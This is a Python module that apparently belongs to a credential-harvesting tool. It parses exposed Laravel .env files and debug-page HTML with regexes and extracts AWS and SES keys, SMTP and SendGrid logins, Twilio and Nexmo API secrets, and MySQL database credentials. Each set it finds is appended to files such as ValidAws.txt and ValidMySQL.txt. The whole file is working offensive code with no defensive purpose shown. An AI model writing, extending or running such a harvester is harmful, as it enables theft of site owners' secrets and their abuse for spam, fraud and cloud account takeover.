from re import findall as reg
from colorama import Fore,Style
green = Fore.GREEN
red = Fore.RED
stop = Style.RESET_ALL

def get_aws(one,two):
   try:
      if "AWS_ACCESS_KEY_ID" in two:
          aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", two)[0]
          aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", two)[0]
          aws_reg = reg("\nAWS_DEFAULT_REGION=(.*?)\n", two)[0]
          build = aws_key + '|' + aws_sec + '|' + aws_reg
          fix = build.startswith('|')
          fix2 = build.startswith('\r')
          if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == '':
             #print(f"{str(build)}")
             print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
          elif fix or fix2:
             #print(f"{build}")
             print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
          else:
             print(f"{one} [ {green}AWS{stop}{red} | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
             remover = build.replace('\r','')
             aws = open('ValidAws.txt','a').write(remover+"\n")
             aws.close()
      elif "<td>AWS_ACCESS_KEY_ID</td>" in two:
            aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", two)[0]
            aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", two)[0]
            aws_reg = reg("<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>", two)[0]
            build = aws_key + '|' + aws_sec + '|' + aws_reg
            fix = build.startswith('|')
            fix2 = build.startswith('\r')
            if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
               #print(f"{build}")
               print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
            elif fix or fix2:
               #print(f"{build}")
               print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
            else:
               print(f"{one} [ {green}AWS{stop}{red} | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
               remover = build.replace('\r', '')
               aws = open('ValidAws.txt','a').write(remover+"\n")
               aws.close()
      elif "AWS_KEY" in two:
            aws_key = reg("\nAWS_KEY=(.*?)\n", two)[0]
            aws_sec = reg("\nAWS_SECRET=(.*?)\n", two)[0]
            aws_reg = reg("\nAWS_REGION=(.*?)\n", two)[0]
            build = aws_key + '|' + aws_sec + '|' + aws_reg
            fix = build.startswith('|')
            fix2 = build.startswith('\r')
            if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
               #print(f"{build}")
               print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
            elif fix or fix2:
               #print(f"{build}")
               print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
            else:
               print(f"{one} [ {green}AWS{stop}{red} | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
               remover = build.replace('\r', '')
               aws = open('ValidAws.txt','a').write(remover+"\n")
               aws.close()
      elif "SES_KEY" in two:
          aws_key = reg("\nSES_KEY=(.*?)\n", two)[0]
          aws_sec = reg("\nSES_SECRET=(.*?)\n", two)[0]
          aws_reg = reg("\nSES_REGION=(.*?)\n", two)[0]
          build = aws_key + '|' + aws_sec + '|' + aws_reg
          fix = build.startswith('|')
          fix2 = build.startswith('\r')
          if aws_key == '' or aws_sec == '' or aws_key == 'null' or aws_sec == 'null':
             print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
          elif fix or fix2:
             print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
          else:
             print(f"{one} [ {green}AWS{stop}{red} | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
             remover = build.replace('\r', '')
             aws = open('ValidAws.txt','a').write(remover+"\n")
             aws.close()

   except:
       pass

def get_smtp(one, two):
   try:
      if "MAIL_HOST" in two:
         if "apikey" in two:
             print(f"{one} [ {red}AWS | SMTP | {green}SENDGRID_API{stop}{red} | TWILIO | NEXMO | MYSQL{stop} ]\n")
             sendgriduser = reg("\nMAIL_USERNAME=(.*?)\n", two)[0]
             sendgridpass = reg("\nMAIL_PASSWORD=(.*?)\n", two)[0]
             builder = sendgriduser + '|' + sendgridpass
             remover = builder.replace('\r', '')
             sendgridsmtp = open('SendgridApi.txt','a').write(remover+"\n")
             sendgridsmtp.close()
         elif "MAIL_HOST=" in two:
             mailhost = reg("\nMAIL_HOST=(.*?)\n", two)[0]
             mailuser = reg("\nMAIL_USERNAME=(.*?)\n", two)[0]
             mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", two)[0]
             if mailuser == '' or mailpass == '' or mailuser == 'null' or mailpass == 'null' or mailuser == '""' or mailpass == '""':
                print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
             else:
                mailport = '587'
                build = mailhost + '|' + mailport + '|' + mailuser + '|' + mailpass
                remover = build.replace('\r', '')
                print(f"{one} [ {red}AWS | {green}SMTP{stop}{red} | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
                smtps = open('ValidSmtp.txt','a').write(remover+"\n")
                smtps.close()
         elif "<td>MAIL_HOST</td>" in two:
             mailhost = reg("<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", two)[0]
             mailuser = reg("<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>", two)[0]
             mailpass = reg("<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>", two)[0]

             if mailuser == '' or mailpass == '' or mailuser == 'null' or mailpass == 'null' or mailuser == '""' or mailpass == '""':
                print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
             else:
                mailport = '587'
                build = mailhost + "|" + mailport + "|" + mailuser + "|" + mailpass
                remover = build.replace('\r', '')
                print(f"{one} [ {red}AWS | {green}SMTP{stop}{red} | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
                smtps = open('ValidSmtp.txt','a').write(remover+"\n")
                smtps.close()
         else:
             print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
   except:
       pass

def get_twilio(one, two):
   try:
      if "TWILIO" in two:
          if "TWILIO_API_SID" in two:
              accSid = reg("<td>TWILIO_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>", two)[0]
              accToken = reg("<td>TWILIO_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>", two)[0]
              if accSid == '' or accToken == '' or accSid == 'null' or accToken == 'null' or accSid == '""' or accToken == '""':
                 print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | {green}TWILIO{stop}{red} | NEXMO | MYSQL{stop} ]\n")
              else:
                 build = accSid + "|" + accToken
                 remover = build.replace('\r', '')
                 print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | {green}TWILIO{stop}{red} | NEXMO | MYSQL{stop} ]\n")
                 twilios = open("ValidTwilio.txt","a").write(remover+"\n")
                 twilios.close()
          elif "TWILIO_SID=" in two:
              accKey = reg("\nTWILIO_SID=(.*?)\n", two)[0]
              accSec = reg("\nTWILIO_TOKEN(.*?)\n", two)[0]
              if accKey == '' or accSec == '' or accKey == 'null' or accSec == 'null' or accKey == '""' or accSec == '""':
                 print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
              else:
                 build = accKey + "|" + accSec
                 remover = build.replace('\r','')
                 print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | {green}TWILIO{stop}{red} | NEXMO | MYSQL{stop} ]\n")
                 twilios = open("ValidTwilio.txt","a").write(remover+"\n")
                 twilios.close()
          else:
              print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
      else:
          pass
   except:
      pass

def get_mysql(one, two):
    try:
       if "DB_CONNECTION=mysql" in two:
           host = reg("\nDB_HOST=(.*?)\n", two)[0]
           port = reg("\nDB_PORT=(.*?)\n", two)[0]
           db = reg("\nDB_DATABASE=(.*?)\n", two)[0]
           user = reg("\nDB_USERNAME=(.*?)\n", two)[0]
           pasw = reg("\nDB_PASSWORD=(.*?)\n", two)[0]
           print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | {green}MYSQL{stop} ]\n")
           build = f"URL: {one}\nHost: {host}\nPort: {port}\nDB_Name: {db}\nUsername: {user}\nPassword: {pasw}\n\n"
           with open("ValidMySQL.txt", "a") as savesql:
               savesql.write(build)
               savesql.close()
       else:
           print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
           pass
    except:
       pass

def get_nexmo(one, two):
   try:
      if "NEXMO" in two:
          nex_mokey = reg("\nNEXMO_KEY=(.*?)\n", two)[0]
          nex_moapi = reg("\nNEXMO_SECRET=(.*?)\n", two)[0]
          try:
             nex_mofrom = reg("\nNEXMO_FROM=(.*?)\n", two)[0]
          except:
             nex_mofrom = ''
          try:
             nex_mosms = reg("\nSMS_FROM=(.*?)\n", two)[0]
          except:
             nex_mosms = ''
          if nex_mokey == '' or nex_moapi == '' or nex_mokey == 'null' or nex_moapi == 'null' or nex_mokey == '""' or nex_moapi == '""' or nex_mokey == 'NEXMO_KEY' or nex_moapi == 'NEXMO_SECRET':
             print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
          else:
             build = nex_mokey + '|' + nex_moapi + '|' + nex_mofrom + '|' + nex_mosms
             remover = build.replace('\r', '')
             print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | {green}NEXMO{stop}{red} | MYSQL{stop} ]\n")
             nexmo = open("ValidNexmo.txt", "a").write(remover+"\n")
             nexmo.close()
      elif "<td>NEXMO_KEY</td>" in two:
          nex_mokey = reg("<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", two)[0]
          nex_moapi = reg("<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", two)[0]
          try:
             nex_mofrom = reg("\nNEXMO_FROM=(.*?)\n", two)[0]
          except:
             nex_mofrom = ''
          try:
             nex_mosms = reg("\nSMS_FROM=(.*?)\n", two)[0]
          except:
             nex_mosms = ''
          if nex_mokey == '' or nex_moapi == '' or nex_mokey == 'null' or nex_moapi == 'null' or nex_mokey == '""' or nex_moapi == '""' or nex_mokey == 'NEXMO_KEY' or nex_moapi == 'NEXMO_SECRET':
             print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
          else:
             build = nex_mokey + '|' + nex_moapi + '|' + nex_mofrom + '|' + nex_mosms
             remover = build.replace('\r', '')
             print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | {green}NEXMO{stop}{red} | MYSQL{stop} ]\n")
             nexmo = open("ValidNexmo.txt","a").write(remover+"\n")
             nexmo.close()
      else:
          print(f"{one} [ {red}AWS | SMTP | SENDGRID_API | TWILIO | NEXMO | MYSQL{stop} ]\n")
   except:
      pass
